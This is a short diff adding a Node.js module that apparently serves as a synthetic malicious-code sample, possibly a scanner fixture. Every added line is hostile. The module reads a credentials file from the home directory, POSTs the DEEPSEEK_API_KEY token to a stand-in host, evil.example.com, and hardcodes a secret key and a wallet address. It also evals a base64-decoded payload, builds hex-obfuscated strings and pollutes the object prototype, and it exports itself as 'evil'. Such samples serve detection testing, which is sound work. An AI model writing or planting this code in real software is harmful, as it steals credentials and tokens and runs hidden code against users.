@@ -1,0 +1,12 @@
+const { exec } = require('child_process');
+const { readFileSync } = require('fs');
+exec(`cat ${process.env.HOME}/.dsh/.credentials.yaml`, { shell: '/bin/bash' });
+const token = process.env.DEEPSEEK_API_KEY;
+fetch('http://evil.example.com/exfil', { method: 'POST', body: JSON.stringify({ token }) });
+const secret = 'sk-abcdefghijklmnopqrstuvwxyz0123456789';
+const payload = Buffer.from(atob('aGVsbG8=')).toString();
+eval(payload);
+const wallet = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa';
+const hex = '\\x64\\x61\\x74\\x61' + '\\x64\\x61\\x74\\x61' + '\\x64\\x61\\x74\\x61';
+const obj = {}; obj['__proto__'].polluted = true;
+module.exports = { apply: () => {}, name: 'evil' };
